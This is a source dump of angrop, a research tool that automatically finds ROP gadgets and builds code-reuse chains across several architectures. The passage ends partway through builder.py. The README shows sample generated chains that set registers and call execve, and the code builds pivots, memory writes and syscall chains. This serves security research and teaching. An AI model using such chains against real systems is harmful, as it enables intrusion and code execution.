Project Path: arc_gmh5225_angrop_hbk99s4g

Source Tree:

```txt
arc_gmh5225_angrop_hbk99s4g
├── Dockerfile
├── LICENSE
├── README.md
├── angrop
│   ├── __init__.py
│   ├── arch.py
│   ├── chain_builder
│   │   ├── __init__.py
│   │   ├── builder.py
│   │   ├── func_caller.py
│   │   ├── mem_changer.py
│   │   ├── mem_writer.py
│   │   ├── pivot.py
│   │   ├── reg_mover.py
│   │   ├── reg_setter.py
│   │   ├── shifter.py
│   │   └── sys_caller.py
│   ├── common.py
│   ├── errors.py
│   ├── gadget_finder
│   │   ├── __init__.py
│   │   └── gadget_analyzer.py
│   ├── rop.py
│   ├── rop_block.py
│   ├── rop_chain.py
│   ├── rop_effect.py
│   ├── rop_gadget.py
│   ├── rop_utils.py
│   └── rop_value.py
├── bin
│   └── angrop-cli
├── docs
│   └── pythonapi.md
├── examples
│   └── linux_escape_chain
│       ├── payload_code.txt
│       ├── pp.txt
│       └── solve.py
├── gifs
│   ├── execve.gif
│   ├── find_gadget.gif
│   └── kernel.gif
├── pyproject.toml
├── setup.cfg
├── setup.py
└── tests
    ├── test_backend.py
    ├── test_badbytes.py
    ├── test_chainbuilder.py
    ├── test_find_gadgets.py
    ├── test_gadgets.py
    ├── test_performance.py
    ├── test_rop.py
    ├── test_ropblock.py
    └── test_ropchain.py

```

`Dockerfile`:

```
from python:3.13-bookworm

run apt-get update && apt-get upgrade -y
run pip install --upgrade pip 

run apt-get install -y make binutils-riscv64-linux-gnu git

# setup python dependencies
run pip install cffi pwntools unicorn==2.0.1.post1 protobuf==5.28.2
run pip install setuptools==79.0.1

run git clone --depth 1 -b wip/riscv https://github.com/angr/archinfo /archinfo
workdir /archinfo
run pip install -e .
run pip install pyvex==9.2.139 cle==9.2.139 claripy==9.2.139
run git clone --depth 1 -b wip/riscv https://github.com/angr/angr /angr
workdir /angr
run sed -i 's/9.2.153.dev0/9.2.139/' angr/__init__.py
run sed -i 's/9.2.153.dev0/9.2.139/' ./pyproject.toml
run pip install --no-build-isolation -e .

# install angrop
copy . /angrop
workdir /angrop
run pip install -e .
run pip install ailment==9.2.153
copy bin/angrop-cli /usr/bin/angrop-cli

```

`LICENSE`:

```
Copyright (c) 2015, The Regents of the University of California
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
  list of conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


```

`README.md`:

```md
angrop
======

angrop is a rop gadget finder and chain builder

## Overview
angrop is a tool to automatically generate rop chains.

It is built on top of angr's symbolic execution engine.
It uses symbolic execution to understand the effects of gadgets and uses constraint solving and graph search for generating chains.
Its design is architecture-agnostic so it supports multiple architectures.

Typically, it generate rop chains faster than humans.
In some cases, it can generate hard rop chains that may take humans hours to build within a few seconds.
Some examples can be found [here](examples).

It comes with a cli and a python api.
The command line `angrop-cli` offers some basic gadget finding/chaining capability such as finding an `system`/`execve` chain or invoking a specific function.
The `angrop` python api offers the full features.
Details can be found in [Usage](README.md#usage).

`angrop` does not just only works for userspace binaries, it works for the Linux kernel as well.

## Architectures
Supported architectures:
* x86/x64
* MIPS
* ARM
* AArch64
* RISC-V (64bit)

It should be relatively easy to support other architectures that are supported by `angr`.
If you'd like to use `angrop` on other architectures, please create an issue and we will look into it :)

## Usage

You can use either the CLI or the Python API.
The CLI only offers some basic functionalities while the Python API provides much more capabilities and is much more powerful.

## CLI
angrop comes with a command line tool for easy day-to-day usage
```bash
# dump command will find gadgets in the target binary, true/false marks whether the gadget is self-contained
$ angrop-cli dump /bin/ls
0x11735: true  : adc bl, byte ptr [rbx + 0x4c]; mov eax, esp; pop r12; pop r13; pop r14; pop rbp; ret 
0x10eaa: true  : adc eax, 0x12469; add rsp, 0x38; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret 
00xe026: true  : adc eax, 0xcec8; pop rbx; cmove rax, rdx; pop r12; pop rbp; ret 
00xdfd4: true  : adc eax, 0xcf18; pop rbx; cmove rax, rdx; pop r12; pop rbp; ret 
00xdfa5: true  : adc eax, 0xcf4d; pop rbx; cmove rax, rdx; pop r12; pop rbp; ret 
......

# chain command will find some predefined chains in the binary
$ angrop-cli chain -t execve /bin/bash
code_base = 0x0
chain = b""
chain += p64(code_base + 0x36083)	# pop rax; pop rbx; pop rbp; ret 
chain += p64(code_base + 0x30016)	# add rsp, 8; ret 
chain += p64(code_base + 0x34873)
chain += p64(code_base + 0x0)
chain += p64(code_base + 0x9616d)	# mov edx, ebp; mov rsi, r12; mov rdi, rbx; call rax
chain += p64(code_base + 0xe501e)	# pop rsi; ret 0
chain += p64(code_base + 0x0)
chain += p64(code_base + 0x31470)	# execve@plt
chain += p64(0x0)
chain += p64(code_base + 0x10d5bf)
```

## Python API
```python
>>> import angr, angrop
>>> p = angr.Project("/bin/ls")
>>> rop = p.analyses.ROP()
>>> rop.find_gadgets()
>>> chain = rop.set_regs(rax=0x41414141, rbx=0x42424242)
>>> chain.print_payload_code()
code_base = 0x0
chain = b""
chain += p64(code_base + 0xf5e2)	# pop rbx; pop r12; test eax, eax; pop rbp; cmovs eax, edx; ret 
chain += p64(0x42424242)
chain += p64(0x0)
chain += p64(0x0)
chain += p64(code_base + 0x812f)	# pop rsi; pop rbp; ret 
chain += p64(0x41414141)
chain += p64(0x0)
chain += p64(code_base + 0x169dd)	# mov rax, rsi; ret 
chain += p64(code_base + 0x10a55)
```
More detailed docs on the Python API can be found [here](docs/pythonapi.md).

## Demo

### gadget finding
![gadget](gifs/find_gadget.gif?raw=true)

### find execve chain
![execve](gifs/execve.gif?raw=true)

### container escape chain for the kernel
![kernel](gifs/kernel.gif?raw=true)

## Paper
We describe our design and findings in this paper

[__ropbot: Reimaging Code Reuse Attack Synthesis__](https://kylebot.net/papers/ropbot.pdf)

Kyle Zeng, Moritz Schloegel, Christopher Salls, Adam Doupé, Ruoyu Wang, Yan Shoshitaishvili, Tiffany Bao

*In Proceedings of the Network and Distributed System Security Symposium (NDSS), February 2026*,

```

`angrop/__init__.py`:

```py
__version__ = "9.2.13.dev0"

from . import rop

import sys
if hasattr(sys, "set_int_max_str_digits"): sys.set_int_max_str_digits(0)


```

`angrop/arch.py`:

```py
"""
Architecture-dependent configurations
"""

class ROPArch:
    def __init__(self, project, kernel_mode=False):
        self.project = project
        self.kernel_mode = kernel_mode
        self.max_sym_mem_access = 1
        self.alignment = project.arch.instruction_alignment
        self.reg_list = self._get_reg_list()
        self.reg_set = set(self.reg_list) # backward compatibility, will be removed
        self.max_block_size = None
        self.fast_mode_max_block_size = None

        a = project.arch
        self.stack_pointer = a.register_names[a.sp_offset]
        self.base_pointer = a.register_names[a.bp_offset]
        self.syscall_insts = None
        self.ret_insts = None
        self.execve_num = None

    def _get_reg_list(self):
        """
        get the set of names of general-purpose registers + bp
        because bp is usually considered as general-purpose these days
        """
        arch = self.project.arch
        sp_reg = arch.register_names[arch.sp_offset]
        ip_reg = arch.register_names[arch.ip_offset]
        bp_reg = arch.register_names[arch.bp_offset]

        # get list of general-purpose registers
        default_regs = arch.default_symbolic_registers
        # prune the register list of the instruction pointer and the stack pointer
        reg_list = [r for r in default_regs if r not in (sp_reg, ip_reg, bp_reg)]
        reg_list.append(bp_reg)
        return reg_list

    def block_make_sense(self, block) -> bool:
        return True

class X86(ROPArch):
    def __init__(self, project, kernel_mode=False):
        super().__init__(project, kernel_mode=kernel_mode)
        self.max_block_size = 20
        self.fast_mode_max_block_size = 12
        self.syscall_insts = {b"\xcd\x80"} # int 0x80
        self.ret_insts = {b"\xc2", b"\xc3", b"\xca", b"\xcb"}
        self.segment_regs = {"cs", "ds", "es", "fs", "gs", "ss"}
        self.execve_num = 0xb

    def _x86_block_make_sense(self, block):
        capstr = str(block.capstone).lower()

        for inst in block.capstone.insns:
            if inst.mnemonic == 'ret' and inst.op_str:
                n = int(inst.op_str, 16)
                if n % self.project.arch.bytes != 0 or n >= 0x100:
                    return False

            if inst.mnemonic == 'int' and inst.op_str:
                n = int(inst.op_str, 16)
                if n != 0x80:
                    return False

        # currently, angrop does not handle "repz ret" correctly, we filter it
        if any(x in capstr for x in ('cli', 'rex', 'repz ret', 'retf', 'hlt', 'wait', 'loop', 'lock')):
            return False
        if not self.kernel_mode:
            if "fs:" in capstr or "gs:" in capstr or "iret" in capstr:
                return False
        if block.size < 1:
            return False
        return True

    def block_make_sense(self, block):
        if not self._x86_block_make_sense(block):
            return False
        for x in block.capstone.insns:
            if x.mnemonic == 'syscall':
                return False
        return True

class AMD64(X86):
    def __init__(self, project, kernel_mode=False):
        super().__init__(project, kernel_mode=kernel_mode)
        self.syscall_insts = {b"\x0f\x05"} # syscall
        self.segment_regs = {"cs_seg", "ds_seg", "es_seg", "fs_seg", "gs_seg", "ss_seg"}
        self.execve_num = 0x3b

    def block_make_sense(self, block):
        return self._x86_block_make_sense(block)

arm_conditional_postfix = ['eq', 'ne', 'cs', 'hs', 'cc', 'lo', 'mi', 'pl',
                           'vs', 'vc', 'hi', 'ls', 'ge', 'lt', 'gt', 'le', 'al']
class ARM(ROPArch):

    def __init__(self, project, kernel_mode=False):
        super().__init__(project, kernel_mode=kernel_mode)
        self.is_thumb = False # by default, we don't use thumb mode
        self.alignment = self.project.arch.bytes
        self.max_block_size = self.alignment * 8
        self.fast_mode_max_block_size = self.alignment * 6
        self.execve_num = 0xb

    def set_thumb(self):
        self.is_thumb = True
        self.alignment = 2
        self.max_block_size = self.alignment * 8
        self.fast_mode_max_block_size = self.alignment * 6

    def set_arm(self):
        self.is_thumb = False
        self.alignment = self.project.arch.bytes
        self.max_block_size = self.alignment * 8
        self.fast_mode_max_block_size = self.alignment * 6

    def block_make_sense(self, block):
        # disable conditional jumps, for now
        # FIXME: we should handle conditional jumps, they are useful
        for insn in block.capstone.insns:
            if insn.insn.mnemonic[-2:] in arm_conditional_postfix:
                return False
        return True

class AARCH64(ROPArch):
    def __init__(self, project, kernel_mode=False):
        super().__init__(project, kernel_mode=kernel_mode)
        self.ret_insts = {b'\xc0\x03_\xd6'}
        self.max_block_size = self.alignment * 10
        self.fast_mode_max_block_size = self.alignment * 6
        self.execve_num = 0xdd

    def block_make_sense(self, block):
        for x in block.capstone.insns:
            # won't be able to ROP with PAC
            if x.mnemonic == 'autiasp':
                return False
        return True

class MIPS(ROPArch):
    def __init__(self, project, kernel_mode=False):
        super().__init__(project, kernel_mode=kernel_mode)
        self.alignment = self.project.arch.bytes
        self.max_block_size = self.alignment * 8
        self.fast_mode_max_block_size = self.alignment * 6
        self.execve_num = 0xfab
        self.syscall_insts = {b"\x0c\x00\x00\x00"} # syscall

class RISCV64(ROPArch):
    def __init__(self, project, kernel_mode=False):
        super().__init__(project, kernel_mode=kernel_mode)
        self.ret_insts = {b"\x82\x80"}
        self.max_block_size = self.alignment * 10
        self.fast_mode_max_block_size = self.alignment * 6
        self.execve_num = 0xdd

def get_arch(project, kernel_mode=False):
    name = project.arch.name
    mode = kernel_mode
    if name == 'X86':
        return X86(project, kernel_mode=mode)
    elif name == 'AMD64':
        return AMD64(project, kernel_mode=mode)
    elif name.startswith('ARM'):
        return ARM(project, kernel_mode=mode)
    elif name == 'AARCH64':
        return AARCH64(project, kernel_mode=mode)
    elif name == 'RISCV64':
        return RISCV64(project, kernel_mode=mode)
    elif name.startswith('MIPS'):
        return MIPS(project, kernel_mode=mode)
    else:
        raise ValueError(f"Unknown arch: {name}")

```

`angrop/chain_builder/__init__.py`:

```py
import logging

from .reg_setter import RegSetter
from .reg_mover import RegMover
from .mem_writer import MemWriter
from .mem_changer import MemChanger
from .func_caller import FuncCaller
from .sys_caller import SysCaller
from .pivot import Pivot
from .shifter import Shifter
from .. import rop_utils
from ..errors import RopException

l = logging.getLogger("angrop.chain_builder")


class ChainBuilder:
    """
    This class provides functions to generate common ropchains based on existing gadgets.
    """

    def __init__(self, project, rop_gadgets, pivot_gadgets, syscall_gadgets, arch, badbytes, roparg_filler):
        """
        Initializes the chain builder.

        :param project: angr project
        :param gadgets: a list of RopGadget gadgets
        :param arch: a RopArch object
        :param badbytes: A list with badbytes, which we should avoid
        :param roparg_filler: An integer used when popping superfluous registers
        """
        self.project = project
        self.arch = arch
        self.badbytes = badbytes
        self.roparg_filler = roparg_filler

        self.gadgets = rop_gadgets
        self.pivot_gadgets = pivot_gadgets
        self.syscall_gadgets = syscall_gadgets

        self._reg_setter = RegSetter(self)
        self._reg_mover = RegMover(self)
        self._mem_writer = MemWriter(self)
        self._mem_changer = MemChanger(self)
        self._func_caller = FuncCaller(self)
        self._pivot = Pivot(self)
        self._sys_caller = SysCaller(self)
        if not SysCaller.supported_os(self.project.loader.main_object.os):
            l.warning("%s is not a fully supported OS, SysCaller may not work on this OS",
                      self.project.loader.main_object.os)
        self._shifter = Shifter(self)
        self._can_do_write = None

    def set_regs(self, *args, **kwargs):
        """
        :param preserve_regs: set of registers to preserve, e.g. ('eax', 'ebx')
        :param registers: dict of registers to values
        :return: a chain which will set the registers to the requested values

        example:
        chain = rop.set_regs(rax=0x1234, rcx=0x41414141)
        """
        return self._reg_setter.run(*args, **kwargs)

    def move_regs(self, **registers):
        """
        :param preserve_regs: set of registers to preserve, e.g. ('eax', 'ebx')
        :param registers: dict of registers, key is the destination register, value is the source register
        :return: a chain which will set the registers to the requested registers

        example:
        chain = rop.move_regs(rax='rcx', rcx='rbx')
        """
        return self._reg_mover.run(**registers)

    def add_to_mem(self, addr, value, data_size=None):
        """
        :param addr: the address to add to
        :param value: the value to add
        :param data_size: the size of the data for the add (defaults to project.arch.bits)
        :return: A chain which will do [addr] += value

        Example:
        chain = rop.add_to_mem(0x8048f124, 0x41414141)
        """
        addr = rop_utils.cast_rop_value(addr, self.project)
        value = rop_utils.cast_rop_value(value, self.project)
        return self._mem_changer.add_to_mem(addr, value, data_size=data_size)

    def write_to_mem(self, addr, data, fill_byte=b"\xff"):
        """
        :param addr: address to store the string
        :param data: string to store
        :param fill_byte: a byte to use to fill up the string if necessary
        :return: a rop chain
        """
        addr = rop_utils.cast_rop_value(addr, self.project)
        return self._mem_writer.write_to_mem(addr, data, fill_byte=fill_byte)

    def pivot(self, thing):
        thing = rop_utils.cast_rop_value(thing, self.project)
        return self._pivot.pivot(thing)

    def func_call(self, address, args, **kwargs):
        """
        :param address: address or name of function to call
        :param args: a list/tuple of arguments to the function
        :param preserve_regs: set of registers to preserve, e.g. ('eax', 'ebx')
        :param needs_return: whether to continue the ROP after invoking the function
        :return: a RopChain which invokes the function with the arguments
        """
        return self._func_caller.func_call(address, args, **kwargs)

    def do_syscall(self, syscall_num, args, needs_return=True, **kwargs):
        """
        build a rop chain which performs the requested system call with the arguments set to 'registers' before
        the call is made
        :param syscall_num: the syscall number to execute
        :param args: the register values to have set at system call time
        :param preserve_regs: set of registers to preserve, e.g. ('eax', 'ebx')
        :param needs_return: whether to continue the ROP after invoking the syscall
        :return: a RopChain which makes the system with the requested register contents
        """
        if not self._sys_caller:
            l.exception("SysCaller does not support OS: %s", self.project.loader.main_object.os)
            return None
        return self._sys_caller.do_syscall(syscall_num, args, needs_return=needs_return, **kwargs)

    def execve(self, path=None, path_addr=None):
        """
        build a rop chain that executes execve
        :param path: path of binary of execute, default to b"/bin/sh\x00"
        :param path_addr: where to store this path string
        """
        if not self._sys_caller:
            l.exception("SysCaller does not support OS: %s", self.project.loader.main_object.os)
            return None
        return self._sys_caller.execve(path=path, path_addr=path_addr)

    def shift(self, length, preserve_regs=None, next_pc_idx=-1):
        """
        build a rop chain to shift the stack to a specific value
        :param length: the length of sp you want to shift
        :param preserve_regs: set of registers to preserve, e.g. ('eax', 'ebx')
        """
        return self._shifter.shift(length, preserve_regs=preserve_regs, next_pc_idx=next_pc_idx)

    def retsled(self, size, preserve_regs=None):
        """
        create a ret-sled ROP chain where if the control flow falls into any point of the chain,
        the control flow will be captured and maintained.
        for example, a series of ret gadgets in x86/x86_64
        :param size: the size of the retsled chain
        :param preserve_regs: set of registers to preserve, e.g. ('eax', 'ebx')
        """
        return self._shifter.retsled(size, preserve_regs=preserve_regs)

    def set_badbytes(self, badbytes):
        self.badbytes = badbytes

    def set_roparg_filler(self, roparg_filler):
        self.roparg_filler = roparg_filler

    def bootstrap(self):
        # get a functional chain builder
        self._reg_mover.bootstrap()
        self._reg_setter.bootstrap()
        self._mem_writer.bootstrap()
        self._mem_changer.bootstrap()
        self._func_caller.bootstrap()
        if self._sys_caller:
            self._sys_caller.bootstrap()
        self._pivot.bootstrap()
        self._shifter.bootstrap()

    def check_can_do_write(self):
        bits = self.project.arch.bits
        if bits == 32:
            ptr = 0x31313131
        else:
            ptr = 0x313131313131
        try:
            self.write_to_mem(ptr, b'A'*4)
            self._can_do_write = True
        except RopException:
            self._can_do_write = False

    def optimize(self, processes=1):
        # optimize reg_mover and reg_setter
        again = True
        cnt = 0
        while again and cnt < 5:
            # check whether we can do memory write in the first place.
            # If we can't, then there is no way to normalize jmp_mem gadgets
            if not self._can_do_write:
                self.check_can_do_write()

            again = self._reg_mover.optimize(processes=processes)
            again |= self._reg_setter.optimize(processes=processes)
            cnt += 1

```

`angrop/chain_builder/builder.py`:

```py
import re
import math
import struct
import logging
import itertools
from abc import abstractmethod
from functools import cmp_to_key
from collections import defaultdict

import angr
import claripy

from .. import rop_utils
from ..errors import RopException
from ..rop_gadget import RopGadget
from ..rop_value import RopValue
from ..rop_chain import RopChain
from ..rop_block import RopBlock
from ..gadget_finder.gadget_analyzer import GadgetAnalyzer

l = logging.getLogger(__name__)

class Builder:
    """
    a generic class to bootstrap more complicated chain building functionality
    """
    used_writable_ptrs = []

    def __init__(self, chain_builder):
        self.chain_builder = chain_builder
        self.project = chain_builder.project
        self.arch = chain_builder.arch
        # used for effect analysis
        self._gadget_analyzer = GadgetAnalyzer(self.project,
                                               True,
                                               kernel_mode=False,
                                               arch=self.arch)

    @property
    def badbytes(self):
        return self.chain_builder.badbytes

    @property
    def roparg_filler(self):
        return self.chain_builder.roparg_filler

    def make_sim_state(self, pc, stack_gsize):
        """
        make a symbolic state with all general purpose register + base pointer symbolized
        and emulate a `pop pc` situation
        """
        state = rop_utils.make_symbolic_state(self.project, self.arch.reg_list, stack_gsize)
        state.stack_pop()
        state.regs.ip = pc
        return state

    def set_regs(self, *args, **kwargs):
        return self.chain_builder._reg_setter.run(*args, **kwargs)

    @staticmethod
    def _sort_chains(chains):
        def cmp_func(chain1, chain2):
            stack_change1 = sum(x.stack_change for x in chain1)
            stack_change2 = sum(x.stack_change for x in chain2)
            if stack_change1 > stack_change2:
                return 1
            elif stack_change1 < stack_change2:
                return -1

            num_mem_access1 = sum(x.num_sym_mem_access for x in chain1)
            num_mem_access2 = sum(x.num_sym_mem_access for x in chain2)
            if num_mem_access1 > num_mem_access2:
                return 1
            if num_mem_access1 < num_mem_access2:
                return -1
            return 0
        return sorted(chains, key=cmp_to_key(cmp_func))

    def _word_contain_badbyte(self, ptr):
        """
        check if a pointer contains any bad byte
        """
        if isinstance(ptr, RopValue):
            if ptr.symbolic:
                return False
            else:
                ptr = ptr.concreted
        raw_bytes = struct.pack(self.project.arch.struct_fmt(), ptr)
        if any(x in raw_bytes for x in self.badbytes):
            return True
        return False

    def _get_ptr_to_writable(self, size):
        """
        get a pointer to writable region that can fit `size` bytes
        currently, we force it to point to a NULL region
        it shouldn't contain bad byte
        """
        null = b'\x00'*size
        used_writable_ptrs = list(self.__class__.used_writable_ptrs)

        plt_sec = None
        # get all writable segments
        if self.arch.kernel_mode:
            segs = [x for x in self.project.loader.main_object.sections if x.name in ('.data', '.bss')]
        else:
            segs = [ s for s in self.project.loader.main_object.segments if s.is_writable ]
            for sec in self.project.loader.main_object.sections:
                if sec.name == '.got.plt':
                    plt_sec = sec
                    break

        def addr_is_used(addr):
            for a, s in used_writable_ptrs:
                if a <= addr < a+s or a < addr+size <= a+s:
                    return True
            return False

        # enumerate through all address to find a good address
        for seg in segs:
            # we should use project.loader.memory.find API, but it is currently broken as reported here:
            # https://github.com/angr/angr/issues/5330
            max_addr = math.ceil(seg.max_addr / 0x1000)*0x1000 # // round up to page size
            contains_plt = False
            # my lazy implementation of avoiding taking addresses from the GOT table
            # because they may not be zero during runtime even though they appear to be so in the binary
            if plt_sec:
                contains_plt = seg.min_addr <= plt_sec.min_addr and seg.max_addr >= plt_sec.max_addr
            for addr in range(seg.min_addr, max_addr):
                if plt_sec and contains_plt and plt_sec.contains_addr(addr):
                    continue
                if any(self._word_contain_badbyte(x) for x in range(addr, addr+size, self.project.arch.bytes)):
                    continue

                data_len = size
                if addr >= seg.max_addr and not addr_is_used(addr):
                    self.__class__.used_writable_ptrs.append((addr, size))
                    return addr
                if addr+size > seg.max_addr:
                    data_len = addr+size - seg.max_addr
                try:
                    data = self.project.loader.memory.load(addr, data_len)
                except KeyError:
                    continue
                if data == null[:data_len] and not addr_is_used(addr):
                    self.__class__.used_writable_ptrs.append((addr, size))
                    return addr

        l.error("used up all possible writable ptrs")
        raise RopException("used up all possible writable ptrs")

    def _get_ptr_to_null(self):
        # get all non-writable segments
        segs = [ s for s in self.project.loader.main_object.segments if not s.is_writable ]
        # enumerate through all address to find a good address
        null = b'\x00'*self.project.arch.bytes
        for seg in segs:
            for addr in self.project.loader.memory.find(null, search_min=seg.min_addr, search_max=seg.max_addr):
                if not self._word_contain_badbyte(addr):
                    return addr

        l.error("used up all possible ptrs to null")
        raise RopException("used up all possible ptrs to null")

    @staticmethod
    def _ast_contains_stack_data(ast):
        vs = ast.variables
        return len(vs) == 1 and list(vs)[0].startswith('symbolic_stack_')

    @staticmethod
    def _ast_contains_reg_data(ast):
        vs = ast.variables
        return len(vs) == 1 and list(vs)[0].startswith('sreg_')

    def _build_ast_constraints(self, ast):
        var_map = {}

        # well, if this ast is just a symbolic value, just record itself
        if ast.op == 'BVS':
            name = ast.args[0]
            bits = ast.args[1]
            reg = name[5:].split('-')[0]
            old_var = ast
            new_var = claripy.BVS("sreg_" + reg + "-", bits)
            var_map[reg] = (old_var, new_var)

        #  if this ast is a tree, record all the children_asts
        for x in ast.children_asts():
            if x.op != 'BVS':
                continue
            name = x.args[0]
            bits = x.args[1]
            if not name.startswith("sreg_"):
                raise NotImplementedError(f"cannot rebuild ast: {ast}")
            reg = name[5:].split('-')[0]
            old_var = x
            if reg not in var_map:
                reg = name[5:].split('-')[0]
                new_var = claripy.BVS("sreg_" + reg + "-", bits)
                var_map[reg] = (old_var, new_var)

        consts = []
        for old, new in var_map.values():
            consts.append(old == new)
        rop_values = {x:RopValue(y[1], self.project) for x,y in var_map.items()}
        return rop_values, consts

    def _solve_ast_constraint(self, ast, value):
        variables = set()
        if ast.op == 'BVS':
            variables.add(ast)
        else:
            for x in ast.children_asts():
                if x.op != 'BVS':
                    continue
                variables.add(x)
        solver = claripy.Solver()
        solver.add(ast == value)

        variables = list(variables)

        res = solver.batch_eval(variables, 1)
        assert res
        res = res[0]

        reg_d = {}
        stack_d = {}
        for idx, v in enumerate(variables):
            name = v.args[0]
            if name.startswith("sreg_"):
                reg = name.split('_')[1][:-1]
                reg_d[reg] = res[idx]
            elif name.startswith("symbolic_stack_"):
                re_res = re.match(r"symbolic_stack_(\d+)_", name)
                offset = int(re_res.group(1)) # type:ignore
                val = res[idx]
                if self.project.arch.memory_endness == "Iend_LE":
                    val = claripy.Reverse(claripy.BVV(val, self.project.arch.bits))
                    val = val.concrete_value
                stack_d[offset] = val
            else:
                raise NotImplementedError("plz raise an issue")
        return reg_d, stack_d

    def _rebalance_ast(self, lhs, rhs, mode='stack'):
        """
        we know that lhs (stack content with modification) == rhs (user ropvalue)
        since user ropvalue may be symbolic, we need to present the stack content using the user ropvalue and store it
        on stack so that users can eval on their own ropvalue and get the correct solves
        TODO: currently, we only support add/sub, Extract/ZeroExt
        """
        # in some cases, we can just solve it
        if mode == 'stack' and lhs.symbolic and not rhs.symbolic and len(lhs.variables) == 1 and lhs.depth > 1:
            target_ast = None
            for ast in lhs.children_asts():
                if ast.op == 'BVS' and ast.args[0].startswith('symbolic_stack'):
                    target_ast = ast
                    break
            assert target_ast is not None

            solver = claripy.Solver()
            solver.add(lhs == rhs)
            return target_ast, claripy.BVV(solver.eval(target_ast, 1)[0], target_ast.size())

        if lhs.op == 'If':
            raise RopException("cannot handle conditional value atm")

        check_func = Builder._ast_contains_stack_data if mode == 'stack' else Builder._ast_contains_reg_data

        if not check_func(lhs):
            raise RopException(f"cannot rebalance the constraint {lhs} == {rhs}")
        while lhs.depth != 1:
            match lhs.op:
                case "__add__" | "__sub__":
                    arg0 = lhs.args[0]
                    arg1 = lhs.args[1]
                    flag = check_func(arg0)
                    op = lhs.op
                    if flag:
                        lhs = arg0
                        other = arg1
                    else:
                        lhs = arg1
                        other = arg0
                    if op == "__add__":
                        rhs -= other
                    elif flag:
                        rhs += other
                    else:
                        rhs = other - rhs
                case "__and__" | "__or__":
                    arg0 = lhs.args[0]
                    arg1 = lhs.args[1]
                    flag0 = check_func(arg0)
                    flag1 = check_func(arg1)
                    if flag0 and flag1:
                        raise RopException(f"cannot rebalance {lhs}")
                    op = lhs.op
                    if flag0:
                        lhs = arg0
                        other = arg1
                    else:
                        lhs = arg1
                        other = arg0
                    if op == "__and__":
                        rhs = rhs & other
                case "Reverse":
                    lhs = lhs.args[0]
                    rhs = claripy.Reverse(rhs)
                case "ZeroExt":
                    rhs_leading: claripy.ast.bv.BV = claripy.Extract(rhs.length-1, # type: ignore
                                                                     rhs.length-lhs.args[0],
                                                                     rhs)
                    if not rhs_leading.symbolic and rhs_leading.concrete_value != 0:
                        raise RopException("rebalance unsat")
                    rhs = claripy.Extract(rhs.length-lhs.args[0]-1, 0, rhs)
                    lhs = lhs.args[1]
                case "SignExt":
                    rhs_leading: claripy.ast.bv.BV = claripy.Extract(rhs.length-1, # type: ignore
                                                                     rhs.length-lhs.args[0],
                                                                     rhs)
                    if not rhs_leading.symbolic and \
                            rhs_leading.concrete_value not in (0, (1<<rhs_leading.length)-1): # type: ignore
                        raise RopException("rebalance unsat")
                    rhs = claripy.Extract(rhs.length-lhs.args[0]-1, 0, rhs)
                    lhs = lhs.args[1]
                case "Extract":
                    assert lhs.length == rhs.length
                    ext_bits = self.project.arch.bits -1 - lhs.args[0]
                    padding_bits = lhs.args[1]
                    if padding_bits:
                        padding = claripy.BVV(0, padding_bits)
                        rhs = claripy.Concat(rhs, padding)
                    if ext_bits:
                        rhs = claripy.ZeroExt(ext_bits, rhs)
                    lhs = lhs.args[2]
                case "Concat":
                    raise RopException("cannot rebalance Concat")
                case "__rshift__" | "__lshift__":
                    bits = lhs.args[1]
                    if lhs.op == '__rshift__':
                        rhs = rhs << bits
                    else:
                        rhs = rhs >> bits
                    lhs = lhs.args[0]
                case "__xor__":
                    if check_func(lhs.args[0]):
                        other = lhs.args[1]
                        lhs = lhs.args[0]
                    else:
                        other = lhs.args[0]
                        lhs = lhs.args[1]
                    rhs = rhs ^ other
                case _:
                    raise ValueError(f"{lhs.op} cannot be rebalanced at the moment. plz create an issue!")
        assert check_func(lhs)
        assert lhs.length == rhs.length
        return lhs, rhs

    @rop_utils.timeout(3)
    def _build_reg_setting_chain(
        self, gadgets, register_dict, constrained_addrs=None):
        """
        This function figures out the actual values needed in the chain
        for a particular set of gadgets and register values
        This is done by stepping a symbolic state through each gadget
        then constraining the final registers to the values that were requested
        """

        total_sc = sum(max(g.stack_change, g.max_stack_offset + self.project.arch.bytes) for g in gadgets)
        arch_bytes = self.project.arch.bytes

        # emulate a 'pop pc' of the first gadget
        test_symbolic_state = rop_utils.make_symbolic_state(
            self.project,
            self.arch.reg_list,
            total_sc//arch_bytes+1, # compensate for the first gadget
        )
        test_symbolic_state.ip = test_symbolic_state.stack_pop()

        # Maps each stack variable to the RopValue or RopGadget that should be placed there.
        stack_var_to_value = {}

        def map_stack_var(ast, value):
            if len(ast.variables) != 1:
                raise RopException("Target value not controlled by a single variable")
            var = next(iter(ast.variables))
            if not var.startswith("symbolic_stack_") and not var.startswith("next_pc_"):
                raise RopException("Target value not controlled by the stack")
            stack_var_to_value[var] = value

        state = test_symbolic_state.copy()

        # Step through each gadget and constrain the ip.
        stack_patchs = []
        for gadget in gadgets:
            if isinstance(gadget, RopGadget):
                map_stack_var(state.ip, gadget)
                state.ip = gadget.addr
            elif isinstance(gadget, RopBlock):
                rb = gadget
                map_stack_var(state.ip, rb)
                state.ip = rb._values[0].concreted
                st = rb._blank_state
                for idx, val in enumerate(rb._values[1:]):
                    state.memory.store(state.regs.sp+idx*arch_bytes, val.data, endness=self.project.arch.memory_endness)
